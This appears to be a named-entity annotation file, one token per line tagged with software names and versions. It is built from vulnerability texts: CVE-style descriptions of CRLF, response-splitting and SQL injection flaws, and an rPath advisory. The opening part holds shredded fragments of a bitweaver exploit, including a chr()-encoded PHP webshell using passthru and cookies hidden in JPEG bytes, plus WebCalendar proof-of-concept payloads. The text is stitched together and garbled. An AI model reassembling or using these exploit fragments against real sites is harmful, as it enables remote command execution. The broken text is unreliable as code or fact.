( O
0x43 O
) O
.ch O
r O
( O
0x4f O
) O
. O

chr O
( O
0x3b O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x61 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x74 O
) O
.chr O
( O
0x68 O
) O
.ch O
r O
( O
0x72 O
) O
. O

chr O
( O
0x3b O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x6f O
) O
.chr O
( O
0x20 O
) O
.chr O
( O
0x22 O
) O
.ch O
r O
( O
0x2a O
) O
. O

.ARTICLES_PKG_NAME O
. O

( O
$ O
resizeFunc O
( O
$ O
pFileHash O
this- O
> O
mErrors O
[ O
] O
= O
Error O
while O
resizing O
article O
image O
unlink O
( O
$ O
tmpImagePath O
explaination O
: O
a O
remote O
user O
can O
go O
to O
: O
to O
submit O
an O
article O
to O
the O
administrator O
, O
you O
can O
attach O
an O
image O
there O
. O

chr O
( O
0x71 O
) O
.chr O
( O
0x75 O
) O
.chr O
( O
0x6f O
) O
.chr O
( O
0x74 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x5f O
) O
.ch O
r O
( O
0x67 O
) O
. O

chr O
( O
0x3f O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x23 O
) O
.chr O
( O
0x94 O
) O
.chr O
( O
0x09 O
) O
.chr O
( O
0x2e O
) O
.chr O
( O
0xff O
) O
.ch O
r O
( O
0xd9 O
) O
. O

chr O
( O
0x72 O
) O
.chr O
( O
0x69 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x6c O
) O
.chr O
( O
0x61 O
) O
.chr O
( O
0x73 O
) O
.ch O
r O
( O
0x68 O
) O
. O

; O
} O
else O
{ O
$ O
result O
string O
[ O
$ O
i O
] O
; O
} O
if O
( O
strlen O
( O
dechex O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
] O
) O
) O
) O
2 O
) O
{ O
$ O
exa.= O
.dechex O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
] O
) O
) O
; O
} O
else O
{ O
$ O
exa.= O
0 O
.dechex O
( O
ord O
( O
$ O
string O
[ O
$ O
i O
cont++ O
; O
if O
( O
$ O
cont O
15 O
) O
{ O
$ O
cont=0 O
; O
$ O
result O
exa O
return O
$ O
exa O
. O

chr O
( O
0x4a O
) O
.chr O
( O
0x46 O
) O
.chr O
( O
0x49 O
) O
.chr O
( O
0x46 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x01 O
) O
.ch O
r O
( O
0x01 O
) O
. O

chr O
( O
0x01 O
) O
.chr O
( O
0x03 O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0x11 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x02 O
) O
.chr O
( O
0x11 O
) O
.ch O
r O
( O
0x01 O
) O
. O

chr O
( O
0x70 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x0d O
) O
.chr O
( O
0x0a O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x72 O
) O
.ch O
r O
( O
0x72 O
) O
. O

chr O
( O
0x73 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x24 O
) O
.chr O
( O
0x5f O
) O
.chr O
( O
0x43 O
) O
.chr O
( O
0x4f O
) O
.chr O
( O
0x4f O
) O
.ch O
r O
( O
0x4b O
) O
. O

chr O
( O
0x3f O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x68 O
) O
.chr O
( O
0x70 O
) O
.chr O
( O
0x20 O
) O
.chr O
( O
0x65 O
) O
.chr O
( O
0x72 O
) O
.ch O
r O
( O
0x72 O
) O
. O

host O
path O
cmd O
OPTIONS O
; O
echo O
host O
: O
target O
server O
( O
ip/hostname O
) O
; O
echo O
path O
: O
path O
to O
bitweaver O
; O
echo O
cmd O
: O
a O
shell O
command O
; O
echo O
Options O
: O
; O
echo O
-p O
[ O
port O
] O
: O
specify O
a O
port O
other O
than O
80 O
; O
echo O
-P O
[ O
ip O
: O
port O
] O
: O
specify O
a O
proxy O
; O
echo O
Examples O
: O
; O
echo O
php O
. O
$ O
argv O
. O

chr O
( O
0x00 O
) O
.chr O
( O
0x48 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x48 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0xff O
) O
.ch O
r O
( O
0xdb O
) O
. O

chr O
( O
0x08 O
) O
.chr O
( O
0xff O
) O
.chr O
( O
0xc4 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x14 O
) O
.chr O
( O
0x10 O
) O
.chr O
( O
0x01 O
) O
.ch O
r O
( O
0x00 O
) O
. O

chr O
( O
0x49 O
) O
.chr O
( O
0x45 O
) O
.chr O
( O
0x5b O
) O
.chr O
( O
0x63 O
) O
.chr O
( O
0x6d O
) O
.chr O
( O
0x64 O
) O
.chr O
( O
0x5d O
) O
.ch O
r O
( O
0x29 O
) O
. O

chr O
( O
0xff O
) O
.chr O
( O
0xc0 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x11 O
) O
.chr O
( O
0x08 O
) O
.chr O
( O
0x00 O
) O
.chr O
( O
0x01 O
) O
.ch O
r O
( O
0x00 O
) O
. O

; O
$ O
packet.= O
Connection O
: O
Close O
; O
sendpacketii O
( O
$ O
packet O
) O
; O
if O
( O
strstr O
( O
$ O
html O
, O
delim O
echo O
Exploit O
succeeded O
temp=explode O
( O
delim O
, O
$ O
html O
) O
; O
die O
( O
$ O
temp O
shell= O
chr O
( O
0xff O
) O
.chr O
( O
0xd8 O
) O
.chr O
( O
0xff O
) O
.chr O
( O
0xfe O
) O
.chr O
( O
0x01 O
) O
.chr O
( O
0xc0 O
) O
.chr O
( O
0x3c O
) O
.ch O
r O
( O
0x3f O
) O
. O

chr O
( O
0x64 O
) O
.chr O
( O
0x28 O
) O
.chr O
( O
0x22 O
) O
.chr O
( O
0x73 O
) O
.chr O
( O
0x75 O
) O
.chr O
( O
0x6e O
) O
.chr O
( O
0x74 O
) O
.ch O
r O
( O
0x7a O
) O
. O

itweaver SN
< SV
= SV
v1.3 SV
multiple O
vulnerabilities O

Unspecified O
vulnerability O
in O
session.c O
in O
PHP SN
before SV
5.1.3 SV
has O
unknown O
impact O
and O
attack O
vectors O
, O
related O
to O
certain O
characters O
in O
session O
names O
, O
including O
special O
characters O
that O
are O
frequently O
associated O
with O
CRLF O
injection O
, O
SQL O
injection O
, O
cross-site O
scripting O
( O
XSS O
) O
, O
and O
HTTP O
response O
splitting O
vulnerabilities O
. O

NOTE O
: O
while O
the O
nature O
of O
the O
vulnerability O
is O
unspecified O
, O
it O
is O
likely O
that O
this O
is O
related O
to O
a O
violation O
of O
an O
expectation O
by O
PHP O
applications O
that O
the O
session O
name O
is O
alphanumeric O
, O
as O
implied O
in O
the O
PHP O
manual O
for O
session_name O
( O
) O
. O

Description O
: O
Previous O
versions O
of O
the O
php O
package O
contain O
multiple O
vulnerabilities O
, O
or O
weaknesses O
that O
may O
enable O
vulnerabilities O
in O
applications O
written O
in O
php O
. O

rPath O
Security O
Advisory O
: O
2006-0182-1 O
Published O
: O
2006-10-05 O
Products O
: O
rPath O
Linux O
1 O
Rating O
: O
Major O
Exposure O
Level O
Classification O
: O
Remote O
System O
User O
Deterministic O
Unauthorized O
Access O
Updated O
Versions O
: O
php=/conary.rpath.com O
@ O
rpl O
: O
devel O
1/4.3.11-15.7-1 O
php-mysql=/conary.rpath.com O
@ O
rpl O
: O
devel O
1/4.3.11-15.7-1 O
php-pgsql=/conary.rpath.com O
@ O
rpl O
: O
devel O
1/4.3.11-15.7-1 O
References O
: O

The O
most O
severe O
of O
these O
vulnerabilities O
may O
enable O
remote O
unauthorized O
access O
vulnerabilities O
, O
depending O
on O
the O
application O
or O
applications O
involved O
. O

Other O
vulnerabilities O
or O
weaknesses O
involve O
SQL O
injection O
attacks O
, O
cross-site O
scripting O
( O
XSS O
) O
, O
information O
exposure O
, O
and O
denial O
of O
service O
vulnerabilities O
. O

rPSA-2006-0182-1 O
php O
php-mysql O
php-pgsql O

Multiple O
HTTP O
response O
splitting O
vulnerabilities O
in O
PHP SN
5.1.1 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
via O
a O
crafted O
Set-Cookie O
header O
, O
related O
to O
the O
( O
1 O
) O
session O
extension O
( O
aka O
ext/session O
) O
and O
the O
( O
2 O
) O
header O
function O
. O

CRLF O
injection O
vulnerability O
in O
layers_toggle.php O
in O
WebCalendar SN
1.0.1 SV
might O
allow O
remote O
attackers O
to O
modify O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
ret O
parameter O
, O
which O
is O
used O
to O
redirect O
URL O
requests O
. O

Author O
: O
lwang O
( O
lwang O
at O
lwang.org O
) O
Publish O
Date O
: O
2005-12-1 O

SQL O
Injection O
in O
activity_log.php O
, O
parameter O
$ O
startid O
does O
not O
validation O
. O

Reference O
: O
Vulnerability O
Analysis O
and O
Proof O
of O
Concept O
: O
1 O
. O

Description O
: O
WebCalendar O
is O
a O
PHP O
application O
used O
to O
maintain O
a O
calendar O
for O
one O
or O
more O
persons O
and O
for O
a O
variety O
of O
purposes O
. O

CRLF O
Injection O
in O
layers_toggle.php O
, O
parameter O
$ O
ret O
does O
not O
validation O
. O

In O
WebCalendar SN
0 O
. O
1.0 SV
, O
activity_log.php O
and O
edit_report_handler.php O
are O
prone O
to O
SQL O
Injection O
attack O
, O
layers_toggle.php O
is O
vulnerable O
to O
CRLF O
Injection O
. O

if O
( O
! O

if O
( O
empty O
( O
$ O
error O
Go O
back O
to O
where O
we O
where O
if O
we O
can O
figure O
it O
out O
. O

if O
( O
strlen O
( O
$ O
ret O
) O
) O
do_redirect O
( O
$ O
ret O
) O
; O
else O
if O
( O
! O

empty O
( O
$ O
HTTP_REFERER O
) O
) O
do_redirect O
( O
$ O
HTTP_REFERER O
) O
; O
else O
send_to_preferred_view O
( O
) O
; O
PoC O
: O
ect_to O
] O

WebCalendar O
Multiple O
Vulnerabilities O
. O

empty O
( O
$ O
startid O
) O
) O
$ O
sql O
.= O
AND O
webcal_entry_log.cal_log_id O
< O
= O
$ O
startid O
; O
PoC O
: O
in O
edit_report_handler.php O
PoC O
: O
POST O
the O
following O
variable O
to O
report_name=Unnamed O
% O
20Report O
& O
is_global=Y O
& O
show_in_trailer=Y O
& O
include_heade O
r=Y O
& O
time_range= O
& O
cat_id=1 O
& O
allow_nav=Y O
& O
include_empty=Y O
& O
page_template= O
% O
26l O
t O
% O
3Bdl O
% O
26gt O
% O
3B O
% O
24 O
% O
7Bdays O
% O
7D O
% O
26lt O
% O
3B O
% O
2Fdl O
% O
26gt O
% O
3B O
& O
day_template= O
% O
26lt O
% O
3Bdt O
% O
26gt O
% O
3B O
% O
26lt O
% O
3Bb O
% O
26gt O
% O
3B O
% O
24 O
% O
7Bdate O
% O
7D O
% O
26lt O
% O
3B O
% O
2Fb O
% O
26gt O
% O
3B O
% O
26lt O
% O
3B O
% O
2Fdt O
% O
26gt O
% O
3B O
% O
0A O
% O
26lt O
% O
3Bdd O
% O
26gt O
% O
3B O
% O
26lt O
% O
3Bdl O
% O
26gt O
% O
3B O
% O
24 O
% O
7Bevents O
% O
7D O
% O
26lt O
% O
3B O
% O
2F O
dl O
% O
26gt O
% O
3B O
% O
26lt O
% O
3B O
% O
2Fdd O
% O
26gt O
% O
3B O
& O
event_template= O
% O
26lt O
% O
3Bdt O
% O
26gt O
% O
3B O
% O
24 O
% O
7Bn O
ame O
% O
7D O
% O
26lt O
% O
3B O
% O
2Fdt O
% O
26gt O
% O
3B O
% O
0A O
% O
26lt O
% O
3Bdd O
% O
26gt O
% O
3B O

HTTP O
response O
splitting O
vulnerability O
in O
phpAdsNew SN
and SN
phpPgAds SN
2.0.6 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTML O
headers O
via O
adclick.php O
and O
possibly O
other O
unspecified O
vectors O
. O

HTTP O
response O
splitting O
vulnerability O
in O
frameset.htm O
in O
SAP SN
Web SN
Application SN
Server SN
( O
WAS SN
) O
6.10 SV
through SV
7.00 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTML O
headers O
via O
the O
sap-exiturl O
parameter O
. O

Multiple O
HTTP O
Response O
Splitting O
vulnerabilities O
in O
( O
1 O
) O
toggleshow.php O
, O
( O
2 O
) O
togglecats.php O
, O
and O
( O
3 O
) O
showprofile.php O
in O
Infopop SN
UBB.Threads SN
before SV
6.5.2 SV
Beta SV
allow O
remote O
attackers O
to O
spoof O
web O
content O
and O
poison O
web O
caches O
via O
CRLF O
( O
% O
0d O
% O
0a O
) O
sequences O
in O
the O
Cat O
parameter O
. O

Multiple O
HTTP O
Response O
Splitting O
vulnerabilities O
in O
osCommerce SN
2.2 SV
Milestone SV
2 SV
and SV
earlier SV
allow O
remote O
attackers O
to O
spoof O
web O
content O
and O
poison O
web O
caches O
via O
hex-encoded O
CRLF O
( O
% O
0d O
% O
0a O
) O
sequences O
in O
the O
( O
1 O
) O
products_id O
or O
( O
2 O
) O
pid O
parameter O
to O
index.php O
or O
( O
3 O
) O
goto O
parameter O
to O
banner.php O
. O

HTTP O
Response O
Splitting O
vulnerability O
in O
the O
Surveys O
in O
PHP-Nuke SN
7.6 SV
allows O
remote O
attackers O
to O
spoof O
web O
content O
and O
poison O
web O
caches O
via O
hex-encoded O
CRLF O
( O
% O
0d O
% O
0a O
) O
sequences O
in O
the O
forwarder O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
Ideal SN
Science SN
IdealBB SN
1.4.9 SV
through SV
1.5.3 SV
allows O
remote O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unknown O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
PhpBB SN
2.0.4 SV
and SV
2.0.9 SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
( O
1 O
) O
the O
mode O
parameter O
to O
privmsg.php O
or O
( O
2 O
) O
the O
redirect O
parameter O
to O
login.php O
. O

CRLF O
injection O
vulnerability O
in O
Comersus SN
Shopping SN
Cart SN
5.0991 SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
the O
redirecturl O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
SnipSnap SN
0.5.2a SV
, O
and SV
other SV
versions SV
before SV
1.0b1 SV
, O
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
. O

CRLF O
injection O
vulnerability O
in O
Aprelium SN
Abyss SN
Web SN
Server SN
1.1.2 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
possibly O
conduct O
HTTP O
Response O
Splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
Location O
header O
. O
